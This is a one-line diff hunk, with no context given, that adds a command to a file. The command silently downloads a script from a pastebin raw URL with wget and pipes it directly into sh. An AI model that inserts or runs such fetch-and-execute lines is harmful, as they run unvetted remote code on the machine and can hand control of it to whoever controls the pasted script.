@@ -1,0 +1,2 @@
+wget -qO- https://pastebin.com/raw/EXAMPLE9 | sh
+
